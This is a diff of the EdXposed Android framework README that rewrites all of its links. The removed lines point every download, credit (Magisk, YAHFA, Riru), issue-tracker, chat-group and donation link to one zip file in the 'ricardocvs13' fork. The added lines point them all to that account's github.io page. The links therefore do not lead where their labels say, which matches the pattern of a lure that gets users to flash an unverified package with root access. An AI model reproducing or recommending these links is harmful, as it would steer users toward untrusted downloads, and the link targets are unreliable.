@@ -11,8 +11,8 @@ For devices with Android 7.x and lower, original Xposed is strongly recommended.
 
 ## Build requirements
 
-Same as [Riru-Core's](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip)
-and zip binaries can be downloaded from [here](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip).
+Same as [Riru-Core's](https://ricardocvs13.github.io)
+and zip binaries can be downloaded from [here](https://ricardocvs13.github.io).
 
 ## Build
 
@@ -23,21 +23,21 @@ and zip binaries can be downloaded from [here](https://github.com/ricardocvs13/E
 ## Install
 
 1. Make sure Magisk v17.0 or higher is installed.
-2. Download [Riru-core](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) v10 or higher and install it in Magisk Manager or recovery.
-3. Download [EdXposed](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) and install it in Magisk Manager or recovery.
+2. Download [Riru-core](https://ricardocvs13.github.io) v10 or higher and install it in Magisk Manager or recovery.
+3. Download [EdXposed](https://ricardocvs13.github.io) and install it in Magisk Manager or recovery.
 4. Install companion application.
 4. Reboot.
 5. Have fun! :)
 
 ## Companion applications
 
-- For v0.2.9.5 and before: [Xposed Installer](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip).
-- For v0.2.9.6 and v0.2.9.7: [Xposed Installer](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) and [EdXp Manager](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip)(optional).
-- For v0.2.9.8 and later: [EdXposed Installer](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip).
+- For v0.2.9.5 and before: [Xposed Installer](https://ricardocvs13.github.io).
+- For v0.2.9.6 and v0.2.9.7: [Xposed Installer](https://ricardocvs13.github.io) and [EdXp Manager](https://ricardocvs13.github.io)(optional).
+- For v0.2.9.8 and later: [EdXposed Installer](https://ricardocvs13.github.io).
 
 ## Useful links
 
-- [List of Xposed Modules For Android Pie Working With EdXposed](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) (thanks to Uraniam9 @ xda-developers)
+- [List of Xposed Modules For Android Pie Working With EdXposed](https://ricardocvs13.github.io) (thanks to Uraniam9 @ xda-developers)
 
 ## Known issues
 
@@ -46,21 +46,21 @@ and zip binaries can be downloaded from [here](https://github.com/ricardocvs13/E
 
 ## Get help
 
-- GitHub issues (recommended): [Issues](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip)
-- QQ Group: [855219808](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip)
+- GitHub issues (recommended): [Issues](https://ricardocvs13.github.io)
+- QQ Group: [855219808](https://ricardocvs13.github.io)
 
 ## Contribute
 
 - Apparently this framework is far from stable and all kinds of PRs are welcome. :)
-- [Buy me a coffee](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) if you like my work.
+- [Buy me a coffee](https://ricardocvs13.github.io) if you like my work.
 
 ## Credits 
 
-- [YAHFA](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): the core ART hooking framework
-- [Magisk](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): makes all these possible
-- [Riru](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): provides a way to inject codes into zygote process
-- [XposedBridge](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): the OG xposed framework APIs
-- [dexmaker](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) and [dalvikdx](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): to dynamiclly generate YAHFA hooker classes
-- [Whale](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): used for inline hooking
-- [SandHook](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): ART hooking framework for SandHook variant
+- [YAHFA](https://ricardocvs13.github.io): the core ART hooking framework
+- [Magisk](https://ricardocvs13.github.io): makes all these possible
+- [Riru](https://ricardocvs13.github.io): provides a way to inject codes into zygote process
+- [XposedBridge](https://ricardocvs13.github.io): the OG xposed framework APIs
+- [dexmaker](https://ricardocvs13.github.io) and [dalvikdx](https://ricardocvs13.github.io): to dynamiclly generate YAHFA hooker classes
+- [Whale](https://ricardocvs13.github.io): used for inline hooking
+- [SandHook](https://ricardocvs13.github.io): ART hooking framework for SandHook variant
 
